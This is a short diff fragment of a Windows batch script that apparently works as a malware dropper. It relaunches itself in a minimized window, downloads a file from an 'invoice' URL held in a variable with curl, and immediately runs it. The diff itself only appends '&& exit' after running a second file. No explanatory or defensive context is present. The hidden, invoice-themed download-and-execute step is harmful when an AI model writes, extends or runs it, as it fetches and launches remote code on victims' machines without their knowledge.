@@ -21,5 +21,5 @@ if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && 
     curl -L -o %PATH_INVOICE% %URL_INVOICE% && %PATH_INVOICE%
 
 
-    "%FILE_FUX%"
+    "%FILE_FUX%" && exit
 exit
